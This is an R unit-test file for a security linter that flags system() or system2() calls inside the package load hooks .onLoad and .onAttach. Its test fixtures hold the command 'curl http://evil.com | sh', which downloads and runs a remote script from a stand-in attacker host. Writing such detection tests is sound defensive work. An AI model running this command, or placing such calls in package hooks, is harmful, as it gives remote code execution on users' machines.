test_that("onload_calls_system_linter returns no lint for non-system calls", {
  code1 = '
  .onLoad <- function(libname, pkgname) {
    packageStartupMessage()
  }
  '
  code2 = '
  .onAttach <- function(libname, pkgname) {
    packageStartupMessage()
  }
  '
  expect_no_lint(code1, lintrsecurity::onload_calls_system_linter())
  expect_no_lint(code2, lintrsecurity::onload_calls_system_linter())
})


test_that("onload_calls_system_linter returns lint for system calls in hooks", {
  code1 = '
  .onLoad <- function(libname, pkgname) {
    system("curl http://evil.com | sh")
  }
  '
  code2 = '
  .onLoad <- function(libname, pkgname) {
    system2("curl", args = c("http://evil.com | sh"))
  }
  '
  code3 = '
  .onAttach <- function(libname, pkgname) {
    system("curl http://evil.com | sh")
  }
  '
  code4 = '
  .onAttach <- function(libname, pkgname) {
    system2("curl", args = c("http://evil.com | sh"))
  }
  '
  expect_lint(code1, "system\\(\\) or system2\\(\\) calls inside \\.onLoad",
    lintrsecurity::onload_calls_system_linter())
  expect_lint(code2, "system\\(\\) or system2\\(\\) calls inside \\.onLoad",
    lintrsecurity::onload_calls_system_linter())
  expect_lint(code3, "system\\(\\) or system2\\(\\) calls inside \\.onLoad",
    lintrsecurity::onload_calls_system_linter())
  expect_lint(code4, "system\\(\\) or system2\\(\\) calls inside \\.onLoad",
    lintrsecurity::onload_calls_system_linter())
})


test_that("onload_calls_system_linter returns no lint for calls outside of hooks", {
  code1 = '
  system("mkdir my_dir")
  '
  code2 = '
  system2("mkdir", args = c("my_dir"))
  '
  expect_no_lint(code1, lintrsecurity::onload_calls_system_linter())
  expect_no_lint(code2, lintrsecurity::onload_calls_system_linter())
})
